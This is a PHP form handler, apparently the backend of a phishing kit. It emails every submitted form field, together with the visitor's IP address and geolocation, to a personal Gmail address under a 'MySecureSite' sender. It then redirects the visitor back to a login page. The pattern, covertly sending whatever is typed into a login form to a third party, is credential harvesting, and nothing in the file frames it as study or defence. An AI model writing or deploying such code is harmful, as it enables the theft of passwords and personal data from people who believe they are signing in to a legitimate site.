<?php
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) return $_SERVER['HTTP_CLIENT_IP'];
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) return $_SERVER['HTTP_X_FORWARDED_FOR'];
    else return $_SERVER['REMOTE_ADDR'];
}

function getLocation($ip) {
    $json = @file_get_contents("http://ip-api.com/json/" . $ip);
    if ($json === FALSE) return "Inconnue";
    $data = json_decode($json, true);
    if ($data && $data['status'] === 'success') {
        return $data['country'] . ", " . $data['regionName'] . ", " . $data['city'];
    }
    return "Inconnue";
}

$ip = getUserIP();
$location = getLocation($ip);
$date = date("Y-m-d H:i:s");

$to = "hamanasri2006@gmail.com";
$subject = "Nouvelle soumission - MySecureSite";
$headers = "From: contact@mysecuresite.com\r\n";
$headers .= "Content-Type: text/plain; charset=UTF-8\r\n";

$message = "Données reçues :\n\n";

// Ajout des champs dynamiquement
foreach ($_POST as $key => $value) {
    $message .= ucfirst($key) . ": " . htmlspecialchars($value) . "\n";
}

$message .= "\nAdresse IP: " . $ip;
$message .= "\nLocalisation: " . $location;
$message .= "\nDate/Heure: " . $date;

mail($to, $subject, $message, $headers);
echo "<script>window.location.href = 'login.html';</script>";
exit();
?>